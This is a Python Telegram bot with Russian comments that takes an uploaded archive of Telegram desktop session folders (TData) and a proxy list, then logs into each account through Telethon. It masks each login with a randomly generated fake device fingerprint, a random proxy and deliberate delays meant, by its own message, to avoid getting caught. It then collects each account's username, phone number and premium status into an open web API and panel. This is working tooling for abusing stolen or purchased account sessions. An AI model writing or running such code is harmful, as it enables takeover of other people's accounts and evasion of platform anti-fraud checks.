import asyncio
import os
import json
import zipfile
import io
import random
import shutil
import traceback
import requests
from pathlib import Path
from datetime import datetime
from urllib.parse import urlparse

from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, WebAppInfo, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiohttp import web
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.users import GetFullUserRequest
from tdata_reader import read_tdata
from python_socks import ProxyType

TOKEN = os.getenv("BOT_TOKEN")
PORT = int(os.getenv("PORT", 8080))
ADMIN_ID = 8720671692 

bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

data_dir = Path("/app/data")
data_dir.mkdir(parents=True, exist_ok=True)
ACCOUNTS_FILE = data_dir / "accounts.json"
DEVICES_FILE = data_dir / "devices.json"
TDATA_DIR = data_dir / "tdata"
TDATA_DIR.mkdir(exist_ok=True)
TEMP_ZIP = data_dir / "temp.zip"

class UploadStates(StatesGroup):
    waiting_zip = State()
    waiting_proxies = State()

# --- ГЕНЕРАТОР УНИКАЛЬНЫХ УСТРОЙСТВ ---
# Теперь каждый аккаунт получает свой уникальный отпечаток
IPHONE_MODELS = ["iPhone 14 Pro", "iPhone 13", "iPhone 12", "iPhone SE (3rd generation)", "iPhone 15"]
ANDROID_MODELS = ["Samsung Galaxy S23", "Xiaomi 13 Pro", "Google Pixel 7", "OnePlus 11", "Huawei P60"]
MAC_MODELS = ["MacBook Pro M2", "MacBook Air M1", "iMac 24\"", "Mac mini M2"]
WIN_MODELS = ["Desktop", "Laptop", "Workstation"]

IOS_VERSIONS = ["16.0", "16.1.1", "16.3", "16.4.1", "17.0", "17.1"]
ANDROID_VERSIONS = ["12", "13", "14"]
MAC_VERSIONS = ["13.1", "13.2", "13.3", "14.0"]
WIN_VERSIONS = ["Windows 10", "Windows 11"]

APP_VERSIONS = ["9.6.0", "9.6.1", "9.7.0", "9.7.1", "10.0.0", "4.8.1", "4.8.2"]

def generate_unique_device():
    # Рандомно выбираем платформу
    platform = random.choice(["ios", "android", "mac", "win"])
    
    if platform == "ios":
        model = random.choice(IPHONE_MODELS)
        system = f"iOS {random.choice(IOS_VERSIONS)}"
    elif platform == "android":
        model = random.choice(ANDROID_MODELS)
        system = f"Android {random.choice(ANDROID_VERSIONS)}"
    elif platform == "mac":
        model = random.choice(MAC_MODELS)
        system = f"macOS {random.choice(MAC_VERSIONS)}"
    else:
        model = random.choice(WIN_MODELS)
        system = random.choice(WIN_VERSIONS)

    return {
        "model": model,
        "system": system,
        "app": random.choice(APP_VERSIONS)
    }

def load_json(file_path, default):
    if file_path.exists():
        try:
            with open(file_path, "r", encoding="utf-8") as f: return json.load(f)
        except Exception: return default
    return default

def save_json(file_path, data):
    with open(file_path, "w", encoding="utf-8") as f: json.dump(data, f, ensure_ascii=False, indent=2)

def get_sticky_device(acc_id):
    devices = load_json(DEVICES_FILE, {})
    if acc_id not in devices:
        devices[acc_id] = generate_unique_device() # Генерируем уникальный
        save_json(DEVICES_FILE, devices)
    return devices[acc_id]

def parse_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    if " " in proxy_str: proxy_str = proxy_str.split(" ")[-1] 
    if not proxy_str.startswith(('http://', 'https://', 'socks5://', 'socks4://')):
        proxy_str = 'socks5://' + proxy_str
        
    parsed = urlparse(proxy_str)
    if parsed.scheme == 'socks5': p_type = ProxyType.SOCKS5
    elif parsed.scheme == 'socks4': p_type = ProxyType.SOCKS4
    else: p_type = ProxyType.HTTP
        
    return (p_type, parsed.hostname, parsed.port, True, parsed.username, parsed.password), proxy_str, parsed.hostname

def get_ip_country(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,countryCode", timeout=3)
        if r.json().get("status") == "success":
            return r.json().get("countryCode")
    except: pass
    return "UNKNOWN"

@web.middleware
async def cors_middleware(request, handler):
    if request.method == 'OPTIONS':
        return web.Response(
            status=200,
            headers={"Access-Control-Allow-Origin": "*", "Access-Control-Allow-Methods": "GET, POST, OPTIONS", "Access-Control-Allow-Headers": "Content-Type"}
        )
    response = await handler(request)
    response.headers["Access-Control-Allow-Origin"] = "*"
    return response

async def handle_get_accounts(request):
    return web.json_response(load_json(ACCOUNTS_FILE, []))

async def handle_get_premium_link(request):
    acc_id = request.query.get('account_id')
    accounts = load_json(ACCOUNTS_FILE, [])
    acc = next((a for a in accounts if a["id"] == acc_id), None)
    
    if not acc:
        return web.json_response({"status": "error", "message": "Аккаунт не найден"}, status=404)

    return web.json_response({
        "status": "ok", 
        "premium_url": "https://t.me/PremiumBot",
        "proxy": acc.get("proxy", "Прокси не назначен"),
        "country": acc.get("proxy_country", "UNKNOWN")
    })

# --- ЛОГИКА БОТА ---

@dp.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    if message.from_user.id == ADMIN_ID:
        await state.set_state(UploadStates.waiting_zip)
        await message.answer("Скинь ZIP-архив с папками TData.", reply_markup=ReplyKeyboardRemove())

@dp.message(UploadStates.waiting_zip, F.document)
async def process_zip(message: Message, state: FSMContext):
    if not message.document.file_name.endswith('.zip'):
        return await message.answer("Это не ZIP файл. Скинь архив.")
    
    await message.answer("⏳ Скачиваю архив...")
    await bot.download(message.document, destination=TEMP_ZIP)
    
    if TDATA_DIR.exists(): shutil.rmtree(TDATA_DIR)
    TDATA_DIR.mkdir()
    try:
        with zipfile.ZipFile(TEMP_ZIP) as z:
            z.extractall(TDATA_DIR)
    except Exception as e:
        return await message.answer(f"❌ Ошибка распаковки: {e}")
        
    await state.set_state(UploadStates.waiting_proxies)
    await message.answer("✅ Архив распакован. Теперь скинь список прокси текстом (каждый с новой строки).")

@dp.message(UploadStates.waiting_proxies, F.text)
async def process_proxies(message: Message, state: FSMContext):
    proxies_text = message.text.strip()
    await message.answer("⏳ Начинаю обработку. Буду делать паузы, чтобы не спалиться. Жди...")
    
    proxy_list = []
    for p_raw in proxies_text.split('\n'):
        p_raw = p_raw.strip()
        if not p_raw: continue
        p_tuple, p_str, p_ip = parse_proxy(p_raw)
        country = get_ip_country(p_ip)
        proxy_list.append({"raw": p_str, "tuple": p_tuple, "country": country})

    if not proxy_list:
        await state.clear()
        return await message.answer("❌ Список прокси пуст. Начни заново /start")

    accounts = []
    folders = [d for d in TDATA_DIR.iterdir() if d.is_dir()]
    
    for i, folder in enumerate(folders):
        acc_id = folder.name 
        device = get_sticky_device(acc_id) # Берем уникальный девайс

        acc_info = {
            "id": acc_id, "username": "Ошибка", "first_name": "", "phone": "N/A", "country": "Неизвестно",
            "ip": "N/A", "proxy_country": "UNKNOWN", "time": datetime.now().strftime("%H:%M"),
            "premium": False, "premium_expires": "Нет", "valid": False, 
            "device": f"{device['model']} ({device['system']})", "proxy": "Нет"
        }

        # --- УМНАЯ ЗАДЕРЖКА ПЕРЕД ПОДКЛЮЧЕНИЕМ ---
        # Спим от 2 до 7 секунд, чтобы имитировать "человеческое" поведение
        await asyncio.sleep(random.uniform(2.0, 7.0))

        try:
            acc = read_tdata(str(folder))
            session_string = acc.to_string_session()
            
            temp_proxy = random.choice(proxy_list)
            
            # Подключаемся с уникальным девайсом и приложением
            client = TelegramClient(
                StringSession(session_string), acc.api_id, acc.api_hash, 
                device_model=device['model'], 
                system_version=device['system'], 
                app_version=device['app'], # Уникальная версия приложения
                proxy=temp_proxy['tuple']
            )
            
            await client.connect()
            
            if await client.is_user_authorized():
                me = await client.get_me()
                acc_info["username"] = me.username or me.first_name or "Без юзернейма"
                acc_info["first_name"] = me.first_name or ""
                acc_info["phone"] = f"+{me.phone}" if me.phone else "Скрыт"
                acc_info["valid"] = True
                
                full_user = await client(GetFullUserRequest(me.id))
                if full_user.full_user.premium_expires:
                    acc_info["premium"] = True
                    exp_date = datetime.fromtimestamp(full_user.full_user.premium_expires)
                    acc_info["premium_expires"] = exp_date.strftime("%d.%m.%Y")
                
                if me.phone:
                    acc_info["country"] = "UA" if me.phone.startswith("380") else "RU" if me.phone.startswith("7") else "US"
                    
                matching_proxies = [p for p in proxy_list if p["country"] == acc_info["country"]]
                chosen_proxy = random.choice(matching_proxies) if matching_proxies else temp_proxy
                    
                acc_info["proxy"] = chosen_proxy["raw"]
                acc_info["proxy_country"] = chosen_proxy["country"]
                acc_info["ip"] = chosen_proxy["tuple"][1]
                
                await client.disconnect()
            else:
                acc_info["username"] = "Не авторизован"
                await client.disconnect()

        except Exception as e:
            # Если аккаунт упал (ошибка сети, бан, битая сессия), просто пишем ошибку и идем дальше
            print(f"ОШИБКА АККАУНТА {folder.name}: {e}")
            acc_info["username"] = f"Ошибка: {str(e)[:20]}"
            await asyncio.sleep(1) # Небольшая пауза после ошибки

        accounts.append(acc_info)
        
        # Сохраняем промежуточный результат, чтобы если бот упадет, данные не потерялись
        save_json(ACCOUNTS_FILE, accounts)

    await state.clear()
    
    web_app = WebAppInfo(url="https://lavrinuksasha5-prog.github.io/premium-bot-web/")
    kb = ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="Открыть панель", web_app=web_app)]], resize_keyboard=True)
    
    await message.answer(f"✅ Обработано аккаунтов: {len(accounts)}.\nОткрывай панель:", reply_markup=kb)

async def main():
    app = web.Application(client_max_size=1024**3, middlewares=[cors_middleware])
    app.router.add_get('/api/accounts', handle_get_accounts)
    app.router.add_get('/api/get_premium_link', handle_get_premium_link)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
